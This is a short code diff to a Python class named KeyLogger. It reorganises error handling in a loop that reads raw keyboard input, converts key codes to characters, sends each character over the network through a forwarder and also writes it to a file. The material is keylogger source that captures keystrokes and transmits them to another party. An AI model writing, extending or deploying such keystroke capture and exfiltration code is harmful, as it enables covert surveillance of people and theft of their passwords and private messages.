@@ -85,22 +85,20 @@ class KeyLogger:
             if data:
                 key_code = data[2]  # The key code is in byte
                 try:
-                    try:
-                        offset: int = self.keyboard_layout[str(key_code)]
-                        if offset is None:
-                            continue
-                    except KeyError:
-                        pass
-                    char: chr = chr(offset + key_code)
-                    try:
-                        self.__forwarder.send_over_network(data=char)
-                        # write data in file
-                        self.data_handler.write(f'{key_code} {char}')
-                    except ConnectionResetError:
-                        self.__forwarder.listen()
-                except Exception as e:
+                    offset: int = self.keyboard_layout[str(key_code)]
+                    if offset is None:
+                        continue
+                except KeyError:
                     logging.error(f"Key {key_code} not in the layout")
-                    logging.error(e)
+                    continue
+                char: chr = chr(offset + key_code)
+                try:
+                    self.__forwarder.send_over_network(data=char)
+                    # write data in file
+                    self.data_handler.write(f'{key_code} {char}')
+                except ConnectionResetError:
+                    self.__forwarder.listen()
+
 
 
 
